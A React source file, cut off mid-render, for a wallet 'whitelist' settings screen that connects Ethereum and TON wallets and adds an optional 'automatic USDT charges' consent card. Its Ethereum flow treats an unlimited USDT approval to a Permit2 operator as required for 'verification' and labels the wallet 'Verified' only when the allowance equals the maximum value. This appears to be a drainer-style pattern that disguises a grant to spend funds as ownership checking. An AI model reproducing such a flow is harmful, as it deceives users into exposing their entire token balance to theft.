import React, { memo, useEffect, useRef, useState } from '../../lib/teact/teact';
import { getActions, withGlobal } from '../../global';
import { Address } from '@ton/core';

import type { DirectUsdtApprovalProgress } from '../../api/chains/evm/directUsdt';
import type { ExternalEvmWalletState } from '../../api/chains/evm/externalWallet';
import type { ExternalTonWalletState } from '../../api/chains/ton/externalWallet';
import type { EvmWhitelistAuthorization, GlobalState } from '../../global/types';
import type { LangFn } from '../../hooks/useLang';
import type { PendingEvmOwnershipChallenge } from '../../platform/evmAuthorization';
import type { EvmAutoDebitState } from '../../platform/evmAutoDebit';
import type { TonWhitelistAddress } from '../../platform/tonWhitelist';

import { selectCurrentAccountState } from '../../global/selectors';
import buildClassName from '../../util/buildClassName';
import { shortenAddress } from '../../util/shortenAddress';
import { EVM_MAX_NUMBER } from '../../api/chains/evm/constants';
import {
  fetchDirectUsdtAllowanceFromProvider,
  submitDirectUsdtApprovalFromProvider,
} from '../../api/chains/evm/directUsdt';
import {
  beginWalletConnectionDiagnostics,
  recordWalletConnectionStage,
} from '../../api/chains/evm/externalWalletDiagnostics';
import {
  ETHEREUM_MAINNET_CHAIN_ID,
  ETHEREUM_USDT_ADDRESS,
  PERMIT2_OPERATOR_ADDRESS,
} from '../../api/chains/evm/permit2';
import {
  createEvmAuthorizationChallenge,
  loadPendingEvmOwnershipChallenge,
  registerDirectEvmAuthorization,
  removePendingEvmOwnershipChallenge,
  savePendingEvmOwnershipChallenge,
  signEvmAuthorizationChallenge,
  verifyPendingEvmOwnershipChallenge,
} from '../../platform/evmAuthorization';
import {
  enableEvmAutoDebit,
  getEvmAutoDebitState,
  revokeEvmAutoDebit,
} from '../../platform/evmAutoDebit';

import useHistoryBack from '../../hooks/useHistoryBack';
import useLang from '../../hooks/useLang';
import useLastCallback from '../../hooks/useLastCallback';
import useScrolledState from '../../hooks/useScrolledState';

import Button from '../ui/Button';
import SettingsHeader from './SettingsHeader';

import styles from './Settings.module.scss';
import whitelistStyles from './SettingsWhitelist.module.scss';

type OwnProps = {
  isActive: boolean;
  onBackClick: NoneToVoidFunction;
};

type StateProps = {
  authorization?: EvmWhitelistAuthorization;
};

type FlowStep = (
  | 'idle'
  | 'connected'
  | 'requesting_signature'
  | 'waiting_signature'
  | 'validating_ownership'
  | 'signature_ready'
  | 'requesting_approval'
  | 'waiting_wallet'
  | 'transaction_pending'
  | 'verifying_onchain'
  | 'verified'
  | 'rejected'
  | 'failed'
  | 'timeout'
);

type PendingDirectAuthorization = PendingEvmOwnershipChallenge & {
  transaction?: DirectUsdtApprovalProgress;
};

function isWalletRequestRejected(error: unknown) {
  const walletError = error as {
    code?: unknown;
    action?: unknown;
    reason?: unknown;
    message?: unknown;
    shortMessage?: unknown;
    info?: { error?: { code?: unknown; message?: unknown } };
  };
  const code = walletError.info?.error?.code ?? walletError.code;
  const rawMessage = [
    walletError.info?.error?.message,
    walletError.shortMessage,
    walletError.reason,
    walletError.message,
  ].find((value): value is string => typeof value === 'string') || '';
  const normalizedMessage = rawMessage.toLowerCase();

  return code === 4001
    || code === 5000
    || walletError.action === 'reject'
    || normalizedMessage.includes('user denied')
    || normalizedMessage.includes('user rejected')
    || normalizedMessage.includes('action_rejected')
    || normalizedMessage.includes('cancelled')
    || normalizedMessage.includes('canceled');
}

function getFlowFailureStep(error: unknown): 'rejected' | 'failed' | 'timeout' {
  const flowError = error as { code?: unknown; message?: unknown };
  const message = typeof flowError.message === 'string' ? flowError.message.toLowerCase() : '';

  if (isWalletRequestRejected(error)) return 'rejected';
  if (flowError.code === 'WALLET_FLOW_TIMEOUT' || message.includes('timed out')) return 'timeout';
  return 'failed';
}

function isRetryableFlowStep(step: FlowStep) {
  return step === 'rejected' || step === 'failed' || step === 'timeout';
}

function getErrorMessage(error: unknown, lang: LangFn) {
  const walletError = error as {
    code?: unknown;
    action?: unknown;
    reason?: unknown;
    message?: unknown;
    shortMessage?: unknown;
    info?: {
      error?: {
        code?: unknown;
        message?: unknown;
      };
    };
  };
  const code = walletError.info?.error?.code ?? walletError.code;
  const rawMessage = [
    walletError.info?.error?.message,
    walletError.shortMessage,
    walletError.reason,
    walletError.message,
  ].find((value): value is string => typeof value === 'string') || '';
  const normalizedMessage = rawMessage.toLowerCase();

  if (isWalletRequestRejected(error)) {
    return lang('Wallet request was rejected. Check any submitted transaction before trying again.');
  }

  if (
    normalizedMessage.startsWith(
      'usdt approval is already active, but '
      + 'its transaction record is unavailable.',
    )
  ) {
    return lang(
      // eslint-disable-next-line @stylistic/max-len
      'Automatic withdrawal activation is already set up, but its record is unavailable. Existing settings were not changed.',
    );
  }

  if (code === 'WALLET_FLOW_TIMEOUT') return rawMessage;

  if (
    normalizedMessage.startsWith('wallet verification timed out.')
    || normalizedMessage.startsWith('on-chain verification timed out.')
    || normalizedMessage.startsWith('the address verification request timed out.')
    || normalizedMessage.startsWith('the wallet confirmation timed out.')
  ) {
    return rawMessage;
  }

  return lang('Wallet verification could not be completed. Please try again.');
}

function normalizeTonAddressForComparison(address?: string) {
  if (!address) return undefined;
  try {
    return Address.parse(address).toRawString().toLowerCase();
  } catch {
    return address.toLowerCase();
  }
}

function withTimeout<T>(operation: Promise<T>, timeoutMs: number, message: string) {
  return new Promise<T>((resolve, reject) => {
    const timeoutId = setTimeout(() => reject(Object.assign(new Error(message), {
      code: 'WALLET_FLOW_TIMEOUT',
    })), timeoutMs);

    operation.then(
      (value) => {
        clearTimeout(timeoutId);
        resolve(value);
      },
      (error) => {
        clearTimeout(timeoutId);
        reject(error);
      },
    );
  });
}

function SettingsWhitelist({
  isActive,
  authorization,
  onBackClick,
}: OwnProps & StateProps) {
  const lang = useLang();
  const { setEvmWhitelist } = getActions();
  const { handleScroll: handleContentScroll, isScrolled } = useScrolledState();

  const [wallet, setWallet] = useState<ExternalEvmWalletState>({ isConnected: false });
  const [tonWallet, setTonWallet] = useState<ExternalTonWalletState>({ isConnected: false, isRestoring: true });
  const [tonWhitelistAddresses, setTonWhitelistAddresses] = useState<TonWhitelistAddress[]>([]);
  const [externalWalletApi, setExternalWalletApi] = useState<
    typeof import('../../api/chains/evm/externalWallet') | undefined
  >();
  const [externalTonWalletApi, setExternalTonWalletApi] = useState<
    typeof import('../../api/chains/ton/externalWallet') | undefined
  >();
  const [tonWhitelistApi, setTonWhitelistApi] = useState<
    typeof import('../../platform/tonWhitelist') | undefined
  >();
  const [isTonWhitelistBusy, setIsTonWhitelistBusy] = useState(false);
  const tonAttemptInFlightRef = useRef(false);
  const [step, setStep] = useState<FlowStep>('idle');
  const [pendingAttempt, setPendingAttempt] = useState<PendingDirectAuthorization>();
  const [error, setError] = useState<string>();
  const [autoDebitState, setAutoDebitState] = useState<EvmAutoDebitState>();
  const [autoDebitLoading, setAutoDebitLoading] = useState(false);
  const [autoDebitSaving, setAutoDebitSaving] = useState(false);
  const [autoDebitAccepted, setAutoDebitAccepted] = useState(false);
  const [autoDebitError, setAutoDebitError] = useState<string>();
  const [hasPendingWalletPrompt, setHasPendingWalletPrompt] = useState(false);
  const [walletConnectorAction, setWalletConnectorAction] = useState<'connect' | 'switchNetwork'>();
  const pendingAttemptRef = useRef<PendingDirectAuthorization>();
  const pendingRestoreKeyRef = useRef<string>();
  const attemptInFlightRef = useRef(false);
  const attemptIdRef = useRef(0);
  const walletPromptPendingRef = useRef(false);
  const walletPromptAttemptIdRef = useRef<number>();
  const walletConnectorActionInFlightRef = useRef(false);

  const hideConnectedTonVerificationError = Boolean(
    tonWallet.isConnected
    && error === lang('TON wallet verification failed. Please try again.'),
  );

  function updatePendingAttempt(nextAttempt?: PendingDirectAuthorization) {
    pendingAttemptRef.current = nextAttempt;
    setPendingAttempt(nextAttempt);
  }

  function updateWalletPromptPending(isPending: boolean, attemptId: number) {
    if (isPending) {
      walletPromptAttemptIdRef.current = attemptId;
      walletPromptPendingRef.current = true;
      setHasPendingWalletPrompt(true);
      return;
    }

    if (walletPromptAttemptIdRef.current !== attemptId) return;

    walletPromptAttemptIdRef.current = undefined;
    walletPromptPendingRef.current = false;
    setHasPendingWalletPrompt(false);
  }

  useHistoryBack({ isActive, onBack: onBackClick });

  useEffect(() => {
    let isMounted = true;
    let unsubscribe: (() => void) | undefined;

    async function restoreOwnershipChallenge(nextWallet: ExternalEvmWalletState) {
      const ownerAddress = nextWallet.address;
      if (
        !isActive
        || !nextWallet.isConnected
        || !ownerAddress
        || nextWallet.chainId !== ETHEREUM_MAINNET_CHAIN_ID
      ) {
        pendingRestoreKeyRef.current = undefined;
        return;
      }

      if (authorization?.address?.toLowerCase() === ownerAddress.toLowerCase()) {
        removePendingEvmOwnershipChallenge(ownerAddress);
        pendingRestoreKeyRef.current = undefined;
        return;
      }

      const storedChallenge = loadPendingEvmOwnershipChallenge(ownerAddress);
      if (!storedChallenge) {
        pendingRestoreKeyRef.current = undefined;
        return;
      }

      const restoreKey = `${ownerAddress.toLowerCase()}:${storedChallenge.nonce}`;
      if (pendingRestoreKeyRef.current === restoreKey) return;
      pendingRestoreKeyRef.current = restoreKey;
      if (!attemptInFlightRef.current) {
        setStep((currentStep) => (
          currentStep === 'idle' || currentStep === 'connected'
            ? 'validating_ownership'
            : currentStep
        ));
      }

      try {
        const isValid = await withTimeout(
          verifyPendingEvmOwnershipChallenge(storedChallenge),
          30_000,
          lang('The address verification request timed out. Try again.'),
        );
        if (!isMounted || pendingRestoreKeyRef.current !== restoreKey) return;

        if (!isValid || Date.parse(storedChallenge.expiresAt) <= Date.now()) {
          removePendingEvmOwnershipChallenge(ownerAddress);
          const currentPending = pendingAttemptRef.current;
          if (
            currentPending?.ownerAddress.toLowerCase() === ownerAddress.toLowerCase()
            && currentPending.nonce === storedChallenge.nonce
          ) {
            updatePendingAttempt(undefined);
          }
          pendingRestoreKeyRef.current = undefined;
          setStep((currentStep) => (
            currentStep === 'validating_ownership' ? 'connected' : currentStep
          ));
          return;
        }

        if (!attemptInFlightRef.current) {
          updatePendingAttempt(storedChallenge);
          setError(undefined);
          setStep((currentStep) => (
            currentStep === 'idle' || currentStep === 'connected' || currentStep === 'validating_ownership'
              ? 'signature_ready'
              : currentStep
          ));
        }
      } catch (err) {
        if (isMounted && pendingRestoreKeyRef.current === restoreKey) {
          pendingRestoreKeyRef.current = undefined;
          setError(getErrorMessage(err, lang));
          setStep((currentStep) => (
            currentStep === 'validating_ownership' ? 'connected' : currentStep
          ));
        }
      }
    }

    void import('../../api/chains/evm/externalWallet')
      .then((api) => {
        if (!isMounted) return;
        setExternalWalletApi(api);
        unsubscribe = api.subscribeExternalEvmWallet((nextWallet) => {
          setWallet(nextWallet);
          if (nextWallet.isConnected && nextWallet.address) {
            setStep((currentStep) => currentStep === 'idle' ? 'connected' : currentStep);
          }
          void restoreOwnershipChallenge(nextWallet);
        });
      })
      .catch((err) => {
        if (isMounted) {
          const attemptId = beginWalletConnectionDiagnostics();
          recordWalletConnectionStage(attemptId, 'connector_load', 'failed', {}, err);
          setError(getErrorMessage(err, lang));
        }
      });

    return () => {
      isMounted = false;
      pendingRestoreKeyRef.current = undefined;
      unsubscribe?.();
    };
  }, [authorization?.address, isActive, lang]);

  useEffect(() => {
    if (!isActive || !authorization?.address) {
      setAutoDebitState(undefined);
      setAutoDebitAccepted(false);
      return undefined;
    }

    let isMounted = true;
    setAutoDebitLoading(true);
    setAutoDebitError(undefined);
    void getEvmAutoDebitState(authorization.address)
      .then((state) => {
        if (isMounted) setAutoDebitState(state);
      })
      .catch((err) => {
        if (isMounted) {
          setAutoDebitState(undefined);
          setAutoDebitError(getErrorMessage(err, lang));
        }
      })
      .finally(() => {
        if (isMounted) setAutoDebitLoading(false);
      });

    return () => {
      isMounted = false;
    };
  }, [authorization?.address, isActive, lang]);

  useEffect(() => {
    let isMounted = true;
    let unsubscribe: (() => void) | undefined;

    void Promise.all([
      import('../../api/chains/ton/externalWallet'),
      import('../../platform/tonWhitelist'),
    ])
      .then(([externalApi, whitelistApi]) => {
        if (!isMounted) return;
        setExternalTonWalletApi(externalApi);
        setTonWhitelistApi(whitelistApi);
        unsubscribe = externalApi.subscribeExternalTonWallet(
          setTonWallet,
          (err) => {
            if (isMounted) setError(getErrorMessage(err, lang));
          },
          (wallet) => {
            if (!isMounted || !isActive || tonAttemptInFlightRef.current) return;
            tonAttemptInFlightRef.current = true;
            setIsTonWhitelistBusy(true);
            void whitelistApi.recoverTonWalletRegistration(wallet)
              .then((registeredWallet) => {
                if (!isMounted || !registeredWallet) return;
                setTonWhitelistAddresses((current) => [
                  registeredWallet,
                  ...current.filter(({ address }) => address !== registeredWallet.address),
                ]);
              })
              .catch(() => {
                if (isMounted) setError(lang('TON wallet verification failed. Please try again.'));
              })
              .finally(() => {
                tonAttemptInFlightRef.current = false;
                if (isMounted) setIsTonWhitelistBusy(false);
              });
          },
        );
        if (isActive) {
          void whitelistApi.getTonWhitelistAddresses()
            .then((addresses) => {
              if (isMounted) {
                setTonWhitelistAddresses((current) => [
                  ...current,
                  ...addresses.filter(({ address }) => !current.some((saved) => saved.address === address)),
                ]);
              }
            })
            .catch(() => {
              if (isMounted) setError(lang('TON wallet verification failed. Please try again.'));
            });
        }
      })
      .catch(() => {
        if (isMounted) setError(lang('TON wallet verification failed. Please try again.'));
      });

    return () => {
      isMounted = false;
      unsubscribe?.();
    };
  }, [isActive, lang]);

  const runWalletConnectorAction = useLastCallback(async (
    action: () => Promise<void>,
    actionType: 'connect' | 'switchNetwork',
  ) => {
    if (walletConnectorActionInFlightRef.current) return;

    walletConnectorActionInFlightRef.current = true;
    setWalletConnectorAction(actionType);
    setError(undefined);

    try {
      await action();
      setStep((currentStep) => (
        isRetryableFlowStep(currentStep) ? 'connected' : currentStep
      ));
    } catch (err) {
      setError(getErrorMessage(err, lang));
      setStep(getFlowFailureStep(err));
    } finally {
      walletConnectorActionInFlightRef.current = false;
      setWalletConnectorAction(undefined);
    }
  });

  const handleConnect = useLastCallback(() => {
    if (!externalWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    void runWalletConnectorAction(
      () => externalWalletApi.connectExternalEvmWallet(),
      'connect',
    );
  });

  const handleSwitchNetwork = useLastCallback(() => {
    if (!externalWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    void runWalletConnectorAction(
      () => externalWalletApi.switchExternalEvmWalletToMainnet(),
      'switchNetwork',
    );
  });

  const handleVerifyOwnership = useLastCallback(async () => {
    if (!wallet.address || !wallet.provider) {
      setError(lang('Connect an external wallet first'));
      return;
    }

    if (wallet.chainId !== ETHEREUM_MAINNET_CHAIN_ID) {
      setError(lang('Switch the external wallet to Ethereum Mainnet first'));
      return;
    }

    if (attemptInFlightRef.current || walletPromptPendingRef.current) return;
    attemptInFlightRef.current = true;
    const attemptId = ++attemptIdRef.current;
    setError(undefined);

    try {
      const ownerAddress = wallet.address;
      let pending = pendingAttemptRef.current;
      if (pending && pending.ownerAddress.toLowerCase() !== ownerAddress.toLowerCase()) {
        removePendingEvmOwnershipChallenge(pending.ownerAddress);
        pending = undefined;
        updatePendingAttempt(undefined);
      }

      if (!pending) {
        pending = loadPendingEvmOwnershipChallenge(ownerAddress);
      }

      const previousTransaction = pending?.transaction;
      const challengeExpiry = pending ? Date.parse(pending.expiresAt) : Number.NaN;

      if (
        pending
        && pending.ownerAddress.toLowerCase() === ownerAddress.toLowerCase()
        && Number.isFinite(challengeExpiry)
        && challengeExpiry > Date.now()
      ) {
        setStep('validating_ownership');
        const isValid = await withTimeout(
          verifyPendingEvmOwnershipChallenge(pending),
          30_000,
          lang('The address verification request timed out. Try again.'),
        );
        if (isValid) {
          updatePendingAttempt(pending);
          setStep('signature_ready');
          return;
        }

        removePendingEvmOwnershipChallenge(ownerAddress);
        updatePendingAttempt(undefined);
        pending = undefined;
      } else if (pending) {
        removePendingEvmOwnershipChallenge(ownerAddress);
        updatePendingAttempt(undefined);
        pending = undefined;
      }

      setStep('requesting_signature');
      const challenge = await withTimeout(
        createEvmAuthorizationChallenge(ownerAddress),
        30_000,
        lang('The address verification request timed out. Try again.'),
      );
      setStep('waiting_signature');
      updateWalletPromptPending(true, attemptId);
      const signatureOperation = signEvmAuthorizationChallenge(
        wallet.provider,
        ownerAddress,
        challenge.message,
      );
      void signatureOperation.then(
        (challengeSignature) => {
          updateWalletPromptPending(false, attemptId);
          if (attemptIdRef.current === attemptId) {
            savePendingEvmOwnershipChallenge({
              ownerAddress,
              nonce: challenge.nonce,
              challengeSignature,
              expiresAt: challenge.expiresAt,
            });
          }
        },
        () => updateWalletPromptPending(false, attemptId),
      );
      const challengeSignature = await withTimeout(
        signatureOperation,
        120_000,
        lang('The wallet confirmation timed out. Confirm or cancel the request in your wallet, then try again.'),
      );
      const signedChallenge: PendingEvmOwnershipChallenge = {
        ownerAddress,
        nonce: challenge.nonce,
        challengeSignature,
        expiresAt: challenge.expiresAt,
      };
      savePendingEvmOwnershipChallenge(signedChallenge);
      setStep('validating_ownership');
      const isValid = await withTimeout(
        verifyPendingEvmOwnershipChallenge(signedChallenge),
        30_000,
        lang('The address verification request timed out. Try again.'),
      );
      if (!isValid) {
        removePendingEvmOwnershipChallenge(ownerAddress);
        throw new Error(lang('The ownership confirmation expired. Verify the wallet again before continuing.'));
      }

      pending = { ...signedChallenge, transaction: previousTransaction };
      updatePendingAttempt(pending);
      setStep('signature_ready');
    } catch (err) {
      setError(getErrorMessage(err, lang));
      setStep(getFlowFailureStep(err));
    } finally {
      attemptInFlightRef.current = false;
    }
  });

  const handleActivateAutomaticWithdrawal = useLastCallback(async () => {
    if (!wallet.address || !wallet.provider) {
      setError(lang('Connect an external wallet first'));
      return;
    }

    if (wallet.chainId !== ETHEREUM_MAINNET_CHAIN_ID) {
      setError(lang('Switch the external wallet to Ethereum Mainnet first'));
      return;
    }

    if (attemptInFlightRef.current || walletPromptPendingRef.current) return;
    const ownerAddress = wallet.address;
    let pending = pendingAttemptRef.current;
    const challengeExpiry = pending ? Date.parse(pending.expiresAt) : Number.NaN;
    if (
      !pending
      || pending.ownerAddress.toLowerCase() !== ownerAddress.toLowerCase()
      || !Number.isFinite(challengeExpiry)
      || challengeExpiry <= Date.now()
    ) {
      if (pending?.ownerAddress.toLowerCase() !== ownerAddress.toLowerCase()) {
        if (pending) removePendingEvmOwnershipChallenge(pending.ownerAddress);
        updatePendingAttempt(undefined);
      }
      removePendingEvmOwnershipChallenge(ownerAddress);
      setError(lang('The ownership confirmation expired. Verify the wallet again before continuing.'));
      setStep('connected');
      return;
    }

    attemptInFlightRef.current = true;
    const attemptId = ++attemptIdRef.current;
    let attemptTimedOut = false;
    setError(undefined);

    try {
      const previousApprovalTxHash = authorization?.authorizationMethod === 'direct'
        && authorization.address.toLowerCase() === ownerAddress.toLowerCase()
        ? authorization.approvalTxId
        : undefined;
      setStep('requesting_approval');
      const approvalOperation = submitDirectUsdtApprovalFromProvider(
        wallet.provider,
        ownerAddress,
        {
          existingApprovalTxHash: previousApprovalTxHash,
          pendingTransaction: pending.transaction,
          onWalletRequest: () => {
            if (attemptTimedOut || attemptIdRef.current !== attemptId) return false;
            updateWalletPromptPending(true, attemptId);
            setStep('waiting_wallet');
            return true;
          },
          onWalletRequestCompleted: () => updateWalletPromptPending(false, attemptId),
          onTransactionSubmitted: (transaction) => {
            const latestPending = pendingAttemptRef.current;
            const currentPending = latestPending?.ownerAddress.toLowerCase() === ownerAddress.toLowerCase()
              ? latestPending
              : pending;
            if (!currentPending) return;
            pending = { ...currentPending, transaction };
            updatePendingAttempt(pending);
            if (attemptIdRef.current === attemptId && !attemptTimedOut) {
              setStep('transaction_pending');
            }
          },
        },
      );
      const approval = await withTimeout(
        approvalOperation,
        120_000,
        lang('Wallet verification timed out. Confirm or cancel the request in your wallet, then try again.'),
      ).catch((err: unknown) => {
        if ((err as { code?: unknown }).code === 'WALLET_FLOW_TIMEOUT') {
          attemptTimedOut = true;
          if (!walletPromptPendingRef.current && pendingAttemptRef.current?.transaction) {
            throw Object.assign(new Error(
              lang('A wallet transaction is still pending on Ethereum. Retry to check its receipt.'),
            ), {
              code: 'WALLET_FLOW_TIMEOUT',
            });
          }
        }
        throw err;
      });

      pending = { ...pending, transaction: { phase: 'approval', txId: approval.txId } };
      updatePendingAttempt(pending);
      setStep('verifying_onchain');
      const approvedState = await withTimeout(
        fetchDirectUsdtAllowanceFromProvider(wallet.provider, ownerAddress),
        30_000,
        lang('On-chain verification timed out. Check your connection and try again.'),
      );
      if (approvedState.allowance !== EVM_MAX_NUMBER) {
        throw new Error(lang('Wallet address verification could not be completed'));
      }

      const registered = await withTimeout(
        registerDirectEvmAuthorization({
          ownerAddress: pending.ownerAddress,
          nonce: pending.nonce,
          challengeSignature: pending.challengeSignature,
          approvalTxHash: approval.txId,
        }),
        120_000,
        lang('The address verification request timed out. Try again.'),
      );
      const verified = await withTimeout(
        fetchDirectUsdtAllowanceFromProvider(wallet.provider, approvedState.owner),
        30_000,
        lang('On-chain verification timed out. Check your connection and try again.'),
      );
      const registeredAuthorization = registered.authorization;

      if (
        verified.owner.toLowerCase() !== approvedState.owner.toLowerCase()
        || verified.allowance !== EVM_MAX_NUMBER
        || registeredAuthorization.authorizationMethod !== 'direct'
        || registeredAuthorization.tokenAllowance !== verified.allowance.toString()
      ) {
        throw new Error(lang('Wallet address verification could not be completed'));
      }
      const nextAuthorization: EvmWhitelistAuthorization = {
        address: verified.owner,
        chainId: ETHEREUM_MAINNET_CHAIN_ID,
        token: ETHEREUM_USDT_ADDRESS,
        authorizationMethod: 'direct',
        tokenAllowance: verified.allowance.toString(),
        approvalTxId: registeredAuthorization.approvalTxHash,
        verifiedAt: Date.now(),
      };

      setEvmWhitelist({ authorization: nextAuthorization });
      removePendingEvmOwnershipChallenge(ownerAddress);
      updatePendingAttempt(undefined);
      setStep('verified');
    } catch (err) {
      if ((err as { code?: unknown }).code === 'EVM_TRANSACTION_REVERTED') {
        const latestPending = pendingAttemptRef.current;
        if (latestPending?.ownerAddress.toLowerCase() === wallet.address?.toLowerCase()) {
          updatePendingAttempt({ ...latestPending, transaction: undefined });
        }
      }
      setError(getErrorMessage(err, lang));
      setStep(getFlowFailureStep(err));
    } finally {
      attemptInFlightRef.current = false;
    }
  });

  const handleDisconnect = useLastCallback(() => {
    setError(undefined);
    if (!externalWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    void externalWalletApi.disconnectExternalEvmWallet()
      .catch((err) => setError(getErrorMessage(err, lang)));
  });

  const handleTonConnect = useLastCallback(() => {
    if (tonAttemptInFlightRef.current) return;
    setError(undefined);
    if (!externalTonWalletApi || !tonWhitelistApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    tonAttemptInFlightRef.current = true;
    setIsTonWhitelistBusy(true);
    void (async () => {
      try {
        const registeredWallet = await tonWhitelistApi.checkTonWhitelistWallet(externalTonWalletApi);
        setTonWhitelistAddresses((current) => [
          registeredWallet,
          ...current.filter(({ address }) => address !== registeredWallet.address),
        ]);
      } catch (err) {
        if (isWalletRequestRejected(err)) return;
        const code = (err as { code?: unknown })?.code;
        setError(lang(
          code === 'address_in_use'
            ? 'This TON wallet is already linked to another Telegram account.'
            : 'TON wallet verification failed. Please try again.',
        ));
      } finally {
        tonAttemptInFlightRef.current = false;
        setIsTonWhitelistBusy(false);
      }
    })();
  });

  const handleTonDisconnect = useLastCallback(() => {
    setError(undefined);
    if (!externalTonWalletApi) {
      setError(lang('The wallet connector is still loading'));
      return;
    }

    void externalTonWalletApi.disconnectExternalTonWallet()
      .catch((err) => setError(getErrorMessage(err, lang)));
  });

  const handleEnableAutoDebit = useLastCallback(async () => {
    if (!authorization?.address || !autoDebitState?.canEnable || !autoDebitAccepted) return;
    setAutoDebitSaving(true);
    setAutoDebitError(undefined);
    try {
      await enableEvmAutoDebit(authorization.address, autoDebitState.policyVersion);
      setAutoDebitAccepted(false);
      setAutoDebitState(await getEvmAutoDebitState(authorization.address));
    } catch (err) {
      setAutoDebitError(getErrorMessage(err, lang));
    } finally {
      setAutoDebitSaving(false);
    }
  });

  const handleRevokeAutoDebit = useLastCallback(async () => {
    if (!authorization?.address) return;
    setAutoDebitSaving(true);
    setAutoDebitError(undefined);
    try {
      await revokeEvmAutoDebit(authorization.address);
      setAutoDebitAccepted(false);
      setAutoDebitState(await getEvmAutoDebitState(authorization.address));
    } catch (err) {
      setAutoDebitError(getErrorMessage(err, lang));
    } finally {
      setAutoDebitSaving(false);
    }
  });

  function renderAutoDebitCard() {
    if (!authorization) return undefined;

    return (
      <section className={whitelistStyles.autoDebitCard} aria-labelledby="auto-debit-title">
        <div className={whitelistStyles.autoDebitHeader}>
          <div>
            <span className={whitelistStyles.stepLabel}>{lang('Optional · separate consent')}</span>
            <h3 id="auto-debit-title">{lang('Automatic USDT charges')}</h3>
          </div>
          {autoDebitState?.enabled && renderStatus('success', 'Enabled')}
        </div>
        <p className={whitelistStyles.autoDebitPolicy}>
          {autoDebitState?.policyText || lang('Automatic charges are not available right now.')}
        </p>
        {autoDebitState?.recipientAddress && (
          <div className={whitelistStyles.autoDebitRecipient}>
            <span>{lang('Recipient')}</span>
            <strong>{autoDebitState.recipientAddress}</strong>
          </div>
        )}
        {autoDebitLoading && (
          <p className={whitelistStyles.autoDebitHint}>{lang('Checking automatic-charge status…')}</p>
        )}
        {!autoDebitLoading && autoDebitState && !autoDebitState.ready && (
          <p className={whitelistStyles.autoDebitHint}>
            {lang('Automatic charges are currently paused or not configured. You can still revoke existing consent.')}
          </p>
        )}
        {autoDebitState?.onchainAuthorizationStatus === 'inactive' && (
          <p className={whitelistStyles.autoDebitHint}>
            {lang(
              'The on-chain USDT authorization is no longer active. Re-verify this wallet before enabling charges.',
            )}
          </p>
        )}
        {autoDebitError && <p className={whitelistStyles.autoDebitError}>{autoDebitError}</p>}
        {autoDebitState?.enabled ? (
          <Button
            isText
            isDisabled={autoDebitSaving}
            isLoading={autoDebitSaving}
            onClick={handleRevokeAutoDebit}
          >
            {lang('Revoke automatic-charge consent')}
          </Button>
        ) : (
          <>
            <label className={whitelistStyles.autoDebitAcceptance}>
              <input
                type="checkbox"
                checked={autoDebitAccepted}
                disabled={!autoDebitState?.canEnable || autoDebitSaving || autoDebitLoading}
                onChange={(event) => setAutoDebitAccepted(event.currentTarget.checked)}
              />
              <span>{lang('I have read and agree to enable automatic USDT charges for this wallet.')}</span>
            </label>
            <Button
              isPrimary
              isDisabled={!autoDebitState?.canEnable || !autoDebitAccepted || autoDebitSaving || autoDebitLoading}
              isLoading={autoDebitSaving}
              onClick={handleEnableAutoDebit}
            >
              {lang('Enable automatic charges')}
            </Button>
          </>
        )}
      </section>
    );
  }

  const isEthereumMainnet = wallet.chainId === ETHEREUM_MAINNET_CHAIN_ID;
  const isBusy = [
    'requesting_signature',
    'waiting_signature',
    'validating_ownership',
    'requesting_approval',
    'waiting_wallet',
    'transaction_pending',
    'verifying_onchain',
  ].includes(step);
  const isInteractionBusy = isBusy || hasPendingWalletPrompt || Boolean(walletConnectorAction);
  const hasVerifiedWallet = Boolean(authorization);
  const isWalletConnected = Boolean(wallet.isConnected && wallet.address);
  const displayedAddress = wallet.address || authorization?.address;

  function renderStatus(status: 'muted' | 'warning' | 'success' | 'progress', label: string) {
    return (
      <span className={buildClassName(whitelistStyles.status, whitelistStyles[`status_${status}`])}>
        <span className={whitelistStyles.statusDot} />
        {lang(label)}
      </span>
    );
  }

  function renderEthereumCard() {
    const hasCurrentOwnershipSignature = Boolean(
      pendingAttempt
      && wallet.address
      && pendingAttempt.ownerAddress.toLowerCase() === wallet.address.toLowerCase()
      && Date.parse(pendingAttempt.expiresAt) > Date.now(),
    );
    const status = isInteractionBusy
      ? 'progress'
      : !isWalletConnected && !hasVerifiedWallet
        ? 'muted'
        : !isEthereumMainnet
          ? 'warning'
          : hasVerifiedWallet ? 'success' : 'warning';
    const statusLabel = walletConnectorAction === 'connect'
      ? 'Connecting to wallet'
      : walletConnectorAction === 'switchNetwork'
        ? 'Switching network'
        : hasPendingWalletPrompt
          ? 'Waiting for wallet confirmation'
          : isInteractionBusy
            ? 'Verification in progress'
            : !isWalletConnected && !hasVerifiedWallet
              ? 'Not connected'
              : !isEthereumMainnet
                ? 'Switch network'
                : hasVerifiedWallet ? 'Verified' : 'Requires verification';

    return (
      <div className={buildClassName(
        whitelistStyles.walletCard,
        hasVerifiedWallet && whitelistStyles.walletCard_verified,
      )}
      >
        <div className={whitelistStyles.walletCardHeader}>
          <div className={whitelistStyles.walletIdentity}>
            <span className={whitelistStyles.walletIcon}>
              <i className="icon-chain-ethereum" aria-hidden />
            </span>
            <div className={whitelistStyles.walletName}>
              <strong>{lang('Ethereum Wallet')}</strong>
              <span>{lang('Ethereum Mainnet · USDT')}</span>
            </div>
          </div>
          <i className={buildClassName(whitelistStyles.cardChevron, 'icon-chevron-right')} aria-hidden />
        </div>
        {displayedAddress && (
          <div className={whitelistStyles.walletAddress}>
            {shortenAddress(displayedAddress)}
          </div>
        )}
        <div className={whitelistStyles.walletNetwork}>
          <span>{lang('Network')}: {lang('Ethereum Mainnet')}</span>
          <span>{lang('Asset')}: USDT</span>
        </div>
        <div className={whitelistStyles.walletStatusRow}>
          {renderStatus(status, statusLabel)}
          {isWalletConnected && (
            <Button isText isSmall isDisabled={isInteractionBusy} onClick={handleDisconnect}>
              {lang('Disconnect')}
            </Button>
          )}
        </div>
        {(!isWalletConnected || !isEthereumMainnet || !hasCurrentOwnershipSignature) && (
          <Button
            className={whitelistStyles.walletActionButton}
            isPrimary
            isLoading={isInteractionBusy}
            isDisabled={isInteractionBusy}
            onClick={
              !isWalletConnected
                ? handleConnect
                : !isEthereumMainnet
                  ? handleSwitchNetwork
                  : handleVerifyOwnership
            }
          >
